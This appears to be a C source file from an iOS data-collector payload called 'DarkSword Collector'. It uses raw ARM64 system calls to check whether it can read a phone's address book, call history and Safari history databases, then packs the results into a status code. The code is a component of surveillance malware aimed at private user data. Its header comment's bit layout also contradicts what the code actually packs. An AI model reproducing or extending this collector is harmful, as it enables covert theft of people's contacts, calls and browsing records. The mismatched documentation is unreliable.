/**
 * DarkSword Collector v21 - Read AddressBook first byte (v19 method)
 * bits 0-7: first byte of AddressBook (0 if unreadable)
 * bits 8-9: status (00=denied, 01=open_only, 11=read_ok)
 * bits 16-23: first byte of CallHistory
 * bits 24-25: status
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

/* Read first byte, return (byte << 8) | status */
static int _read1(const char *path) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0;  /* denied */
    unsigned char b = 0;
    int n = (int)_svc3(SYS_read, fd, (long)&b, 1);
    _svc1(SYS_close, fd);
    if (n > 0) return ((int)b << 8) | 3;  /* read_ok + byte */
    return 1;  /* open_only */
}

int ds_start(void) {
    int addr = _read1("/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
    int call = _read1("/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
    int hist = _read1("/var/mobile/Library/Safari/History.db");

    /* Pack: addr in bits 0-9, call in bits 10-19, hist in bits 20-29 */
    return (addr & 0x3FF) | ((call & 0x3FF) << 10) | ((hist & 0x3FF) << 20);
}
